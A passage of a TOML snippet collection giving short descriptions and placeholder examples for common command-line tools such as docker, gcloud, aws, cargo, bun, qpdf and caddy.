  command = "osage -T <png> -O <path/to/input.gv>"
  output = ""

[[snippets]]
  description = "Render a `svg` image with the specified output filename (lowercase -o)"
  command = "osage -T <svg> -o <path/to/image.svg> <path/to/input.gv>"
  output = ""

[[snippets]]
  description = "Render the output in `ps`, `pdf`, `svg`, `fig`, `png`, `gif`, `jpg`, `json`, or `dot` format"
  command = "osage -T <format> -O <path/to/input.gv>"
  output = ""

[[snippets]]
  description = "Render a `gif` image using `stdin` and `stdout`"
  command = "echo ""<digraph {this -> that} >"" | osage -T <gif> > <path/to/image.gif>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "osage -?"
  output = ""

[[snippets]]
  description = "Log in to the Netlify account"
  command = "netlify login"
  output = ""

[[snippets]]
  description = "Deploy the contents of a directory to Netlify"
  command = "netlify deploy"
  output = ""

[[snippets]]
  description = "Configure continuous deployment for a new or an existing site"
  command = "netlify init"
  output = ""

[[snippets]]
  description = "Start a local dev server"
  command = "netlify dev"
  output = ""

[[snippets]]
  description = "Create a volume"
  command = "docker volume create <volume_name>"
  output = ""

[[snippets]]
  description = "Create a volume with a specific label"
  command = "docker volume create --label <label> <volume_name>"
  output = ""

[[snippets]]
  description = "Create a `tmpfs` volume a size of 100 MiB and an uid of 1000"
  command = "docker volume create --opt <type>=<tmpfs> --opt <device>=<tmpfs> --opt <o>=<size=100m,uid=1000> <volume_name>"
  output = ""

[[snippets]]
  description = "List all volumes"
  command = "docker volume ls"
  output = ""

[[snippets]]
  description = "Remove a volume"
  command = "docker volume rm <volume_name>"
  output = ""

[[snippets]]
  description = "Display information about a volume"
  command = "docker volume inspect <volume_name>"
  output = ""

[[snippets]]
  description = "Remove all unused local volumes"
  command = "docker volume prune"
  output = ""

[[snippets]]
  description = "Display help for a subcommand"
  command = "docker volume <subcommand> --help"
  output = ""

[[snippets]]
  description = "Render diagrams to default format (PNG)"
  command = "plantuml <diagram1.puml> <diagram2.puml>"
  output = ""

[[snippets]]
  description = "Render a diagram in given format (e.g. `png`, `pdf`, `svg`, `txt`)"
  command = "plantuml -t <format> <diagram.puml>"
  output = ""

[[snippets]]
  description = "Render all diagrams of a directory"
  command = "plantuml <path/to/diagrams>"
  output = ""

[[snippets]]
  description = "Render a diagram to the output directory"
  command = "plantuml -o <path/to/output> <diagram.puml>"
  output = ""

[[snippets]]
  description = "Render a diagram with the configuration file"
  command = "plantuml -config <config.cfg> <diagram.puml>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "plantuml -help"
  output = ""

[[snippets]]
  description = "Create a virtual environment"
  command = "vf new <virtualenv_name>"
  output = ""

[[snippets]]
  description = "Create a virtual environment for a specific Python version"
  command = "vf new --python </usr/local/bin/python3.8> <virtualenv_name>"
  output = ""

[[snippets]]
  description = "Activate and use the specified virtual environment"
  command = "vf activate <virtualenv_name>"
  output = ""

[[snippets]]
  description = "Connect the current virtualenv to the current directory, so that it is activated automatically as soon as you enter it (and deactivated as soon as you leave)"
  command = "vf connect"
  output = ""

[[snippets]]
  description = "Deactivate the current virtual environment"
  command = "vf deactivate"
  output = ""

[[snippets]]
  description = "List all virtual environments"
  command = "vf ls"
  output = ""

[[snippets]]
  description = "Remove a virtual environment"
  command = "vf rm <virtualenv_name>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "vf help"
  output = ""

[[snippets]]
  description = "Convert PNM files to an HP LaserJet PCL XL printer stream"
  command = "pnmtopclxl <path/to/input1.pnm path/to/input2.pnm ...> > <path/to/output.pclxl>"
  output = ""

[[snippets]]
  description = "Specify the resolution of the image as well as the location of the page from the upper left corner of each image"
  command = "pnmtopclxl -dpi <resolution> -xoffs <x_offset> -yoffs <y_offset> <path/to/input1.pnm path/to/input2.pnm ...> > <path/to/output.pclxl>"
  output = ""

[[snippets]]
  description = "Generate a duplex printer stream for the specified paper format"
  command = "pnmtopclxl -duplex <vertical|horizontal> -format <letter|legal|a3|a4|a5|...> <path/to/input1.pnm path/to/input2.pnm ...> > <path/to/output.pclxl>"
  output = ""

[[snippets]]
  description = "List all routes"
  command = "bgpgrep <master6.mrt>"
  output = ""

[[snippets]]
  description = "List routes received from a specific peer, determined by the peer's AS number"
  command = "bgpgrep <master4.mrt> -peer <64498>"
  output = ""

[[snippets]]
  description = "List routes received from a specific peer, determined by the peer's IP address"
  command = "bgpgrep <master4.mrt.bz2> -peer <2001:db8:dead:cafe:acd::19e>"
  output = ""

[[snippets]]
  description = "List routes which have certain ASNs in their AS path"
  command = "bgpgrep <master6.mrt.bz2> -aspath '<64498 64510>'"
  output = ""

[[snippets]]
  description = "List routes that lead to a specific address"
  command = "bgpgrep <master6.mrt.bz2> -supernet '<2001:db8:dead:cafe:aef::5>'"
  output = ""

[[snippets]]
  description = "List routes that have communities from a specific AS"
  command = "bgpgrep <master4.mrt> -communities \( '<64497>:*' \)"
  output = ""

[[snippets]]
  description = "Display the prime-factorization of a number"
  command = "factor <number>"
  output = ""

[[snippets]]
  description = "Take the input from `stdin` if no argument is specified"
  command = "echo <number> | factor"
  output = ""

[[snippets]]
  description = "Recursively find files matching a specific pattern in the current directory"
  command = "fd ""<string|regex>"""
  output = ""

[[snippets]]
  description = "Find files that begin with `foo`"
  command = "fd ""^foo"""
  output = ""

[[snippets]]
  description = "Find files with a specific extension"
  command = "fd --extension txt"
  output = ""

[[snippets]]
  description = "Find files in a specific directory"
  command = "fd ""<string|regex>"" <path/to/directory>"
  output = ""

[[snippets]]
  description = "Include ignored and hidden files in the search"
  command = "fd --hidden --no-ignore ""<string|regex>"""
  output = ""

[[snippets]]
  description = "Execute a command on each search result returned"
  command = "fd ""<string|regex>"" --exec <command>"
  output = ""

[[snippets]]
  description = "Get the properties of all the user limits"
  command = "ulimit -a"
  output = ""

[[snippets]]
  description = "Get hard limit for the number of simultaneously opened files"
  command = "ulimit -H -n"
  output = ""

[[snippets]]
  description = "Get soft limit for the number of simultaneously opened files"
  command = "ulimit -S -n"
  output = ""

[[snippets]]
  description = "Set max per-user process limit"
  command = "ulimit -u 30"
  output = ""

[[snippets]]
  description = "Enable [a]synchronous scrolling"
  command = "cmatrix -a"
  output = ""

[[snippets]]
  description = "Change the text [C]olor (green by default)"
  command = "cmatrix -C <red>"
  output = ""

[[snippets]]
  description = "Enable [r]ainbow mode"
  command = "cmatrix -r"
  output = ""

[[snippets]]
  description = "Use a screen [u]pdate delay of 100 centiseconds (1 second)"
  command = "cmatrix -u 100"
  output = ""

[[snippets]]
  description = "Run with concurrent users and a specified amount of requests per second"
  command = "loadtest --concurrency <10> --rps <200> <https://example.com>"
  output = ""

[[snippets]]
  description = "Run with a custom HTTP header"
  command = "loadtest --headers ""<accept:text/plain;text-html>"" <https://example.com>"
  output = ""

[[snippets]]
  description = "Run with a specific HTTP method"
  command = "loadtest --method <GET> <https://example.com>"
  output = ""

[[snippets]]
  description = "Print the absolute path of the current Git repository"
  command = "git root"
  output = ""

[[snippets]]
  description = "Print the current working directory relative to the root of the current Git repository"
  command = "git root --relative"
  output = ""

[[snippets]]
  description = "List outdated dependencies in the current directory"
  command = "ncu"
  output = ""

[[snippets]]
  description = "List outdated global npm packages"
  command = "ncu --global"
  output = ""

[[snippets]]
  description = "Upgrade all dependencies in the current directory"
  command = "ncu --upgrade"
  output = ""

[[snippets]]
  description = "Interactively upgrade dependencies in the current directory"
  command = "ncu --interactive"
  output = ""

[[snippets]]
  description = "List outdated dependencies up to the highest minor version"
  command = "ncu --target <minor>"
  output = ""

[[snippets]]
  description = "List outdated dependencies that match a keyword or regular expression"
  command = "ncu --filter <keyword|/regex/>"
  output = ""

[[snippets]]
  description = "List only a specific section of outdated dependencies"
  command = "ncu --dep <dev|optional|peer|prod|packageManager>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "ncu --help"
  output = ""

[[snippets]]
  description = "Print the current directory"
  command = "pwd"
  output = ""

[[snippets]]
  description = "Print the current directory, and resolve all symlinks (i.e. show the "physical" path)"
  command = "pwd -P"
  output = ""

[[snippets]]
  description = "Convert a PPM image to an AutoCAD slide"
  command = "ppmtoacad <path/to/file.ppm> > <path/to/file.acad>"
  output = ""

[[snippets]]
  description = "Convert a PPM image to an AutoCAD binary database import file"
  command = "ppmtoacad -dxb <path/to/file.ppm> > <path/to/file.dxb>"
  output = ""

[[snippets]]
  description = "Restrict the colors in the output to 8 RGB shades"
  command = "ppmtoacad -8 <path/to/file.ppm> > <path/to/file.dxb>"
  output = ""

[[snippets]]
  description = "Check whether the specified files contain valid UTF-8"
  command = "isutf8 <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Print errors using multiple lines"
  command = "isutf8 --verbose <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Do not print anything to `stdout`, indicate the result merely with the exit code"
  command = "isutf8 --quiet <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Only print the names of the files containing invalid UTF-8"
  command = "isutf8 --list <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Same as `--list` but inverted, i.e., only print the names of the files containing valid UTF-8"
  command = "isutf8 --invert <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Highlight source code from a file with the Python lexer and output to `stdout`"
  command = "chroma --lexer <python> <path/to/source_file.py>"
  output = ""

[[snippets]]
  description = "Highlight source code from a file with the Go lexer and output to an HTML file"
  command = "chroma --lexer <go> --formatter <html> <path/to/source_file.go> > <path/to/target_file.html>"
  output = ""

[[snippets]]
  description = "Highlight source code from `stdin` with the C++ lexer and output to an SVG file, using the Monokai style"
  command = "<command> | chroma --lexer <c++> --formatter <svg> --style <monokai> > <path/to/target_file.svg>"
  output = ""

[[snippets]]
  description = "List available lexers, styles and formatters"
  command = "chroma --list"
  output = ""

[[snippets]]
  description = "Print the contents of the system `PATH` variable, with one element per line"
  command = "lspath"
  output = ""

[[snippets]]
  description = "Print the current contents of the system `PATH` variable, with one element per line, with the output paged"
  command = "lspath --page"
  output = ""

[[snippets]]
  description = "Move a specific job to `new_printer`"
  command = "lpmove <job_id> <new_printer>"
  output = ""

[[snippets]]
  description = "Move a job from `old_printer` to `new_printer`"
  command = "lpmove <old_printer>-<job_id> <new_printer>"
  output = ""

[[snippets]]
  description = "Move all jobs from `old_printer` to `new_printer`"
  command = "lpmove <old_printer> <new_printer>"
  output = ""

[[snippets]]
  description = "Move a specific job to `new_printer` on a specific server"
  command = "lpmove -h <server> <job_id> <new_printer>"
  output = ""

[[snippets]]
  description = "Start a web server instance"
  command = "hg serve"
  output = ""

[[snippets]]
  description = "Start a web server instance on the specified port"
  command = "hg serve --port <port>"
  output = ""

[[snippets]]
  description = "Start a web server instance on the specified listening address"
  command = "hg serve --address <address>"
  output = ""

[[snippets]]
  description = "Start a web server instance with a specific identifier"
  command = "hg serve --name <name>"
  output = ""

[[snippets]]
  description = "Start a web server instance using the specified theme (see the templates directory)"
  command = "hg serve --style <style>"
  output = ""

[[snippets]]
  description = "Start a web server instance using the specified SSL certificate bundle"
  command = "hg serve --certificate <path/to/certificate>"
  output = ""

[[snippets]]
  description = "Initialize a website"
  command = "hexo init <path/to/directory>"
  output = ""

[[snippets]]
  description = "Create a new article"
  command = "hexo new <layout> <title>"
  output = ""

[[snippets]]
  description = "Generate static files"
  command = "hexo generate"
  output = ""

[[snippets]]
  description = "Start a local server"
  command = "hexo server"
  output = ""

[[snippets]]
  description = "Deploy the website"
  command = "hexo deploy"
  output = ""

[[snippets]]
  description = "Clean the cache file (`db.json`) and generated files (`public/`)"
  command = "hexo clean"
  output = ""

[[snippets]]
  description = "Set the project property in the core section"
  command = "gcloud config set project <project_id>"
  output = ""

[[snippets]]
  description = "Set the compute zone for future operations"
  command = "gcloud config set compute/zone <zone_name>"
  output = ""

[[snippets]]
  description = "Disable prompting to make gcloud suitable for scripting"
  command = "gcloud config set disable_prompts true"
  output = ""

[[snippets]]
  description = "View the list of properties currently in use"
  command = "gcloud config list"
  output = ""

[[snippets]]
  description = "Unset a previously set property"
  command = "gcloud config unset <property_name>"
  output = ""

[[snippets]]
  description = "Create a new configuration profile"
  command = "gcloud config configurations create <configuration_name>"
  output = ""

[[snippets]]
  description = "Switch between different configuration profiles"
  command = "gcloud config configurations activate <configuration_name>"
  output = ""

[[snippets]]
  description = "Start an interactive Lua shell"
  command = "luajit"
  output = ""

[[snippets]]
  description = "Execute a Lua script"
  command = "luajit <path/to/script.lua> <--optional-argument>"
  output = ""

[[snippets]]
  description = "Execute a Lua expression"
  command = "luajit -e '<print(""Hello World"")>'"
  output = ""

[[snippets]]
  description = "Run a single query"
  command = "dolt sql --query ""<INSERT INTO t values (1, 3);>"""
  output = ""

[[snippets]]
  description = "List all saved queries"
  command = "dolt sql --list-saved"
  output = ""

[[snippets]]
  description = "Install a specific version of Node.js"
  command = "fnm install <node_version>"
  output = ""

[[snippets]]
  description = "List all available Node.js versions and highlight the default one"
  command = "fnm list"
  output = ""

[[snippets]]
  description = "Use a specific version of Node.js in the current shell"
  command = "fnm use <node_version>"
  output = ""

[[snippets]]
  description = "Set the default Node.js version"
  command = "fnm default <node_version>"
  output = ""

[[snippets]]
  description = "Uninstall a given Node.js version"
  command = "fnm uninstall <node_version>"
  output = ""

[[snippets]]
  description = "Upgrade all outdated casks and formulae"
  command = "brew upgrade"
  output = ""

[[snippets]]
  description = "Upgrade a specific formula/cask"
  command = "brew upgrade <formula|cask>"
  output = ""

[[snippets]]
  description = "Print what would be upgraded, but don't actually upgrade anything"
  command = "brew upgrade --dry-run"
  output = ""

[[snippets]]
  description = "Log in to your LastPass account, by entering your master password when prompted"
  command = "lpass login <username>"
  output = ""

[[snippets]]
  description = "Show login status"
  command = "lpass status"
  output = ""

[[snippets]]
  description = "List all sites grouped by category"
  command = "lpass ls"
  output = ""

[[snippets]]
  description = "Generate a new password for gmail.com with the identifier `myinbox` and add to LastPass"
  command = "lpass generate --username <username> --url <gmail.com> <myinbox> <password_length>"
  output = ""

[[snippets]]
  description = "Show password for a specified entry"
  command = "lpass show <myinbox> --password"
  output = ""

[[snippets]]
  description = "View documentation for a builtin [f]unction, a [v]ariable or an [a]PI"
  command = "perldoc -<f|v|a> <name>"
  output = ""

[[snippets]]
  description = "Search in the the question headings of Perl FAQ"
  command = "perldoc -q <regex>"
  output = ""

[[snippets]]
  description = "Send output directly to `stdout` (by default, it is send to a pager)"
  command = "perldoc -T <page|module|program|URL>"
  output = ""

[[snippets]]
  description = "Specify the language code of the desired translation"
  command = "perldoc -L <language_code> <page|module|program|URL>"
  output = ""

[[snippets]]
  description = "Decode a file that was encoded with `uuencode` and print the result to `stdout`"
  command = "uudecode <path/to/encoded_file>"
  output = ""

[[snippets]]
  description = "Decode a file that was encoded with `uuencode` and write the result to a file"
  command = "uudecode -o <path/to/decoded_file> <path/to/encoded_file>"
  output = ""

[[snippets]]
  description = "Display the section headers of a given binary"
  command = "wasm-objdump -h <file.wasm>"
  output = ""

[[snippets]]
  description = "Display the entire disassembled output of a given binary"
  command = "wasm-objdump -d <file.wasm>"
  output = ""

[[snippets]]
  description = "Display the details of each section"
  command = "wasm-objdump --details <file.wasm>"
  output = ""

[[snippets]]
  description = "Display the details of a given section"
  command = "wasm-objdump --section '<import>' --details <file.wasm>"
  output = ""

[[snippets]]
  description = "Perform checks, create a `.crate` file and upload it to the registry"
  command = "cargo publish"
  output = ""

[[snippets]]
  description = "Perform checks, create a `.crate` file but don't upload it (equivalent of `cargo package`)"
  command = "cargo publish --dry-run"
  output = ""

[[snippets]]
  description = "Use the specified registry (registry names can be defined in the configuration - the default is <https://crates.io>)"
  command = "cargo publish --registry <name>"
  output = ""

[[snippets]]
  description = "Compare 2 files"
  command = "sdiff <path/to/file1> <path/to/file2>"
  output = ""

[[snippets]]
  description = "Compare 2 files, ignoring all tabs and whitespace"
  command = "sdiff -W <path/to/file1> <path/to/file2>"
  output = ""

[[snippets]]
  description = "Compare 2 files, ignoring whitespace at the end of lines"
  command = "sdiff -Z <path/to/file1> <path/to/file2>"
  output = ""

[[snippets]]
  description = "Compare 2 files in a case-insensitive manner"
  command = "sdiff -i <path/to/file1> <path/to/file2>"
  output = ""

[[snippets]]
  description = "Compare and then merge, writing the output to a new file"
  command = "sdiff -o <path/to/merged_file> <path/to/file1> <path/to/file2>"
  output = ""

[[snippets]]
  description = "Issue a certificate using an automatic DNS API mode"
  command = "acme.sh --issue --dns <gnd_gd> --domain <example.com>"
  output = ""

[[snippets]]
  description = "Issue a wildcard certificate (denoted by an asterisk) using an automatic DNS API mode"
  command = "acme.sh --issue --dns <dns_namesilo> --domain <example.com> --domain <*.example.com>"
  output = ""

[[snippets]]
  description = "Issue a certificate using a DNS alias mode"
  command = "acme.sh --issue --dns <dns_cf> --domain <example.com> --challenge-alias <alias-for-example-validation.com>"
  output = ""

[[snippets]]
  description = "Issue a certificate while disabling automatic Cloudflare/Google DNS polling after the DNS record is added by specifying a custom wait time in seconds"
  command = "acme.sh --issue --dns <dns_namecheap> --domain <example.com> --dnssleep <300>"
  output = ""

[[snippets]]
  description = "Issue a certificate using a manual DNS mode"
  command = "acme.sh --issue --dns --domain <example.com> --yes-I-know-dns-manual-mode-enough-go-ahead-please"
  output = ""

[[snippets]]
  description = "Index paths recursively for the very first run"
  command = "scd -ar <path/to/directory>"
  output = ""

[[snippets]]
  description = "Change to a specific directory"
  command = "scd <path/to/directory>"
  output = ""

[[snippets]]
  description = "Change to a path matching specific patterns"
  command = "scd ""<pattern1 pattern2 ...>"""
  output = ""

[[snippets]]
  description = "Show selection menu and ranking of 20 most likely directories"
  command = "scd -v"
  output = ""

[[snippets]]
  description = "Add a specific alias for the current directory"
  command = "scd --alias=<word>"
  output = ""

[[snippets]]
  description = "Change to a directory using a specific alias"
  command = "scd <word>"
  output = ""

[[snippets]]
  description = "Delete an empty S3 bucket"
  command = "aws s3 rb s3://<bucket_name>"
  output = ""

[[snippets]]
  description = "Force delete an S3 bucket and its non-versioned objects (will crash if versioned objects are present)"
  command = "aws s3 rb s3://<bucket_name> --force"
  output = ""

[[snippets]]
  description = "Delete elements matching an XPATH from an XML document"
  command = "xml edit --delete ""<XPATH1>"" <path/to/input.xml|URI>"
  output = ""

[[snippets]]
  description = "Move an element node of an XML document from XPATH1 to XPATH2"
  command = "xml edit --move ""<XPATH1>"" ""<XPATH2>"" <path/to/input.xml|URI>"
  output = ""

[[snippets]]
  description = "Rename all attributes named "id" to "ID""
  command = "xml edit --rename ""<//*/@id>"" -v ""<ID>"" <path/to/input.xml|URI>"
  output = ""

[[snippets]]
  description = "Rename sub-elements of the element "table" that are named "rec" to "record""
  command = "xml edit --rename ""</xml/table/rec>"" -v ""<record>"" <path/to/input.xml|URI>"
  output = ""

[[snippets]]
  description = "Update the XML table record with "id=3" to the value "id=5""
  command = "xml edit --update ""<xml/table/rec[@id=3]/@id>"" -v <5> <path/to/input.xml|URI>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "xml edit --help"
  output = ""

[[snippets]]
  description = "Split a file, each split having 10 lines (except the last split)"
  command = "split -l <10> <path/to/file>"
  output = ""

[[snippets]]
  description = "Split a file into 5 files. File is split such that each split has same size (except the last split)"
  command = "split -n <5> <path/to/file>"
  output = ""

[[snippets]]
  description = "Split a file with 512 bytes in each split (except the last split; use 512k for kilobytes and 512m for megabytes)"
  command = "split -b <512> <path/to/file>"
  output = ""

[[snippets]]
  description = "Split a file with at most 512 bytes in each split without breaking lines"
  command = "split -C <512> <path/to/file>"
  output = ""

[[snippets]]
  description = "Get temporary security credentials to access specific AWS resources"
  command = "aws sts assume-role --role-arn <aws_role_arn>"
  output = ""

[[snippets]]
  description = "Get an IAM user or role whose credentials are used to call the operation"
  command = "aws sts get-caller-identity"
  output = ""

[[snippets]]
  description = "Start a REPL (interactive shell)"
  command = "pypy"
  output = ""

[[snippets]]
  description = "Execute script in a given Python file"
  command = "pypy <path/to/file.py>"
  output = ""

[[snippets]]
  description = "Execute script as part of an interactive shell"
  command = "pypy -i <path/to/file.py>"
  output = ""

[[snippets]]
  description = "Execute a Python expression"
  command = "pypy -c ""<expression>"""
  output = ""

[[snippets]]
  description = "Run library module as a script (terminates option list)"
  command = "pypy -m <module> <arguments>"
  output = ""

[[snippets]]
  description = "Install a package using pip"
  command = "pypy -m pip install <package>"
  output = ""

[[snippets]]
  description = "Interactively debug a Python script"
  command = "pypy -m pdb <path/to/file.py>"
  output = ""

[[snippets]]
  description = "List network resources in a region that are used against a subscription quota"
  command = "az network list-usages"
  output = ""

[[snippets]]
  description = "List all virtual networks in a subscription"
  command = "az network vnet list"
  output = ""

[[snippets]]
  description = "Create a virtual network"
  command = "az network vnet create --address-prefixes <10.0.0.0/16> --name <vnet> --resource_group <group_name> --submet-name <subnet> --subnet-prefixes <10.0.0.0/24>"
  output = ""

[[snippets]]
  description = "Enable accelerated networking for a network interface card"
  command = "az network nic update --accelerated-networking true --name <nic> --resource-group <resource_group>"
  output = ""

[[snippets]]
  description = "Invoke `moro` without parameters, to set the current time as the start of the working day"
  command = "moro"
  output = ""

[[snippets]]
  description = "Specify a custom time for the start of the working day"
  command = "moro hi <09:30>"
  output = ""

[[snippets]]
  description = "Invoke `moro` without parameters a second time, to set the current time at the end of the working day"
  command = "moro"
  output = ""

[[snippets]]
  description = "Specify a custom time for the end of the working day"
  command = "moro bye <17:30>"
  output = ""

[[snippets]]
  description = "Add a note on the current working day"
  command = "moro note <3 hours on project Foo>"
  output = ""

[[snippets]]
  description = "Show a report of time logs and notes for the current working day"
  command = "moro report"
  output = ""

[[snippets]]
  description = "Show a report of time logs and notes for all working days on record"
  command = "moro report --all"
  output = ""

[[snippets]]
  description = "Show a decorated tree graph for all branches annotated with tags and branch names"
  command = "git show-tree"
  output = ""

[[snippets]]
  description = "Lint a specific directory"
  command = "parallel-lint <path/to/directory>"
  output = ""

[[snippets]]
  description = "Lint a directory using the specified number of parallel processes"
  command = "parallel-lint -j <processes> <path/to/directory>"
  output = ""

[[snippets]]
  description = "Lint a directory, excluding the specified directory"
  command = "parallel-lint --exclude <path/to/excluded_directory> <path/to/directory>"
  output = ""

[[snippets]]
  description = "Lint a directory of files using a comma-separated list of extension(s)"
  command = "parallel-lint -e <php,html,phpt> <path/to/directory>"
  output = ""

[[snippets]]
  description = "Lint a directory and output the results as JSON"
  command = "parallel-lint --json <path/to/directory>"
  output = ""

[[snippets]]
  description = "Lint a directory and show Git Blame results for rows containing errors"
  command = "parallel-lint --blame <path/to/directory>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr fossil rm"
  output = ""

[[snippets]]
  description = "Compile and link 2 source files to generate an executable"
  command = "tcc -o <executable_name> <path/to/file1.c> <path/to/file2.c>"
  output = ""

[[snippets]]
  description = "Directly run an input file like a script and pass arguments to it"
  command = "tcc -run <path/to/source_file.c> <arguments>"
  output = ""

[[snippets]]
  description = "Interpret C source files with a shebang inside the file"
  command = "#!/full/path/to/tcc -run"
  output = ""

[[snippets]]
  description = "Run a REPL command with line editing, persistent history and prompt completion"
  command = "rlwrap <command>"
  output = ""

[[snippets]]
  description = "Use all words seen on input and output for prompt completion"
  command = "rlwrap --remember <command>"
  output = ""

[[snippets]]
  description = "Better prompt completion if prompts contain ANSI colour codes"
  command = "rlwrap --ansi-colour-aware <command>"
  output = ""

[[snippets]]
  description = "Enable filename completion (case sensitive)"
  command = "rlwrap --complete-filenames <command>"
  output = ""

[[snippets]]
  description = "Add coloured prompts, use colour name, or an ASCI-conformant colour specification. Use an uppercase colour name for bold styling"
  command = "rlwrap --prompt-colour=<black|red|green|yellow|blue|cyan|purple|white|colour_spec> <command>"
  output = ""

[[snippets]]
  description = "Extract pages 1-3, 5 and 6-10 from a PDF file and save them as another one"
  command = "qpdf --empty --pages <path/to/input.pdf> <1-3,5,6-10> -- <path/to/output.pdf>"
  output = ""

[[snippets]]
  description = "Merge (concatenate) all the pages of multiple PDF files and save the result as a new PDF"
  command = "qpdf --empty --pages <path/to/file1.pdf file2.pdf ...> -- <path/to/output.pdf>"
  output = ""

[[snippets]]
  description = "Merge (concatenate) given pages from a list of PDF files and save the result as a new PDF"
  command = "qpdf --empty --pages <path/to/file1.pdf> <1,6-8> <path/to/file2.pdf> <3,4,5> -- <path/to/output.pdf>"
  output = ""

[[snippets]]
  description = "Write each group of `n` pages to a separate output file with a given filename pattern"
  command = "qpdf --split-pages=<n> <path/to/input.pdf> <path/to/out_%d.pdf>"
  output = ""

[[snippets]]
  description = "Rotate certain pages of a PDF with a given angle"
  command = "qpdf --rotate=<90:2,4,6> --rotate=<180:7-8> <path/to/input.pdf> <path/to/output.pdf>"
  output = ""

[[snippets]]
  description = "Remove the password from a password-protected file"
  command = "qpdf --password=<password> --decrypt <path/to/input.pdf> <path/to/output.pdf>"
  output = ""

[[snippets]]
  description = "Run a JavaScript file or a `package.json` script"
  command = "bun run <path/to/file|script_name>"
  output = ""

[[snippets]]
  description = "Run unit tests"
  command = "bun test"
  output = ""

[[snippets]]
  description = "Download and install all the packages listed as dependencies in `package.json`"
  command = "bun install"
  output = ""

[[snippets]]
  description = "Add a dependency to `package.json`"
  command = "bun add <module_name>"
  output = ""

[[snippets]]
  description = "Remove a dependency from `package.json`"
  command = "bun remove <module_name>"
  output = ""

[[snippets]]
  description = "Create a new Bun project in the current directory"
  command = "bun init"
  output = ""

[[snippets]]
  description = "Start a REPL (interactive shell)"
  command = "bun repl"
  output = ""

[[snippets]]
  description = "Upgrade Bun to the latest version"
  command = "bun upgrade"
  output = ""

[[snippets]]
  description = "List files one per line"
  command = "ls -1"
  output = ""

[[snippets]]
  description = "List all files, including hidden files"
  command = "ls -a"
  output = ""

[[snippets]]
  description = "List all files, with trailing `/` added to directory names"
  command = "ls -F"
  output = ""

[[snippets]]
  description = "Long format list (permissions, ownership, size, and modification date) of all files"
  command = "ls -la"
  output = ""

[[snippets]]
  description = "Long format list with size displayed using human-readable units (KiB, MiB, GiB)"
  command = "ls -lh"
  output = ""

[[snippets]]
  description = "Long format list sorted by size (descending) recursively"
  command = "ls -lSR"
  output = ""

[[snippets]]
  description = "Long format list of all files, sorted by modification date (oldest first)"
  command = "ls -ltr"
  output = ""

[[snippets]]
  description = "Only list directories"
  command = "ls -d */"
  output = ""

[[snippets]]
  description = "Add the latest version of a dependency to the current project"
  command = "cargo add <dependency>"
  output = ""

[[snippets]]
  description = "Add a specific version of a dependency"
  command = "cargo add <dependency>@<version>"
  output = ""

[[snippets]]
  description = "Add a dependency and enable one or more specific features"
  command = "cargo add <dependency> --features <feature_1>,<feature_2>"
  output = ""

[[snippets]]
  description = "Add an optional dependency, which then gets exposed as a feature of the crate"
  command = "cargo add <dependency> --optional"
  output = ""

[[snippets]]
  description = "Add a local crate as a dependency"
  command = "cargo add --path <path/to/crate_directory>"
  output = ""

[[snippets]]
  description = "Add a development or build dependency"
  command = "cargo add <dependency> --<dev|build>"
  output = ""

[[snippets]]
  description = "Add a dependency with all default features disabled"
  command = "cargo add <dependency> --no-default-features"
  output = ""

[[snippets]]
  description = "Analyze the current directory"
  command = "progpilot"
  output = ""

[[snippets]]
  description = "Analyze a specific file or directory"
  command = "progpilot <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Specify a custom configuration file"
  command = "progpilot --configuration <path/to/configuration.yml>"
  output = ""

[[snippets]]
  description = "Start Caddy in the foreground"
  command = "caddy run"
  output = ""

[[snippets]]
  description = "Start Caddy with the specified Caddyfile"
  command = "caddy run --config <path/to/Caddyfile>"
  output = ""

[[snippets]]
  description = "Start Caddy in the background"
  command = "caddy start"
  output = ""

[[snippets]]
  description = "Stop a background Caddy process"
  command = "caddy stop"
  output = ""

[[snippets]]
  description = "Run a simple file server on the specified port with a browsable interface"
  command = "caddy file-server --listen :<8000> --browse"
  output = ""

[[snippets]]
  description = "Run a reverse proxy server"
  command = "caddy reverse-proxy --from :<80> --to localhost:<8000>"
  output = ""

[[snippets]]
  description = "Print a quotation"
  command = "fortune"
  output = ""

[[snippets]]
  description = "Print an offensive quotation"
  command = "fortune -o"
  output = ""

[[snippets]]
  description = "Print a long quotation"
  command = "fortune -l"
  output = ""

[[snippets]]
  description = "Print a short quotation"
  command = "fortune -s"
  output = ""

[[snippets]]
  description = "List the available quotation database files"
  command = "fortune -f"
  output = ""

[[snippets]]
  description = "Print a quotation from one of the database files listed by `fortune -f`"
  command = "fortune <path/to/file>"
  output = ""

[[snippets]]
  description = "List the services on a docker daemon"
  command = "docker service ls"
  output = ""

[[snippets]]
  description = "Create a new service"
  command = "docker service create --name <service_name> <image>:<tag>"
  output = ""

[[snippets]]
  description = "Display detailed information about one or more services"
  command = "docker service inspect <service_name_or_ID1 service_name_or_ID2>"
  output = ""

[[snippets]]
  description = "List the tasks of one or more services"
  command = "docker service ps <service_name_or_ID1 service_name_or_ID2 ...>"
  output = ""

[[snippets]]
  description = "Scale to a specific number of replicas for a space-separated list of services"
  command = "docker service scale <service_name>=<count_of_replicas>"
  output = ""

[[snippets]]
  description = "Remove one or more services"
  command = "docker service rm <service_name_or_ID1 service_name_or_ID2>"
  output = ""

[[snippets]]
  description = "Start the GUI"
  command = "maestral gui"
  output = ""

[[snippets]]
  description = "Print current status of Maestral"
  command = "maestral status"
  output = ""

[[snippets]]
  description = "Pause syncing"
  command = "maestral pause"
  output = ""

[[snippets]]
  description = "Resume syncing"
  command = "maestral resume"
  output = ""

[[snippets]]
  description = "Print sync status of a specific file or folder"
  command = "maestral filestatus <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Run a project if the current directory contains a `project.godot` file, otherwise open the project manager"
  command = "godot"
  output = ""

[[snippets]]
  description = "Edit a project (the current directory must contain a `project.godot` file)"
  command = "godot -e"
  output = ""

[[snippets]]
  description = "Open the project manager even if the current directory contains a `project.godot` file"
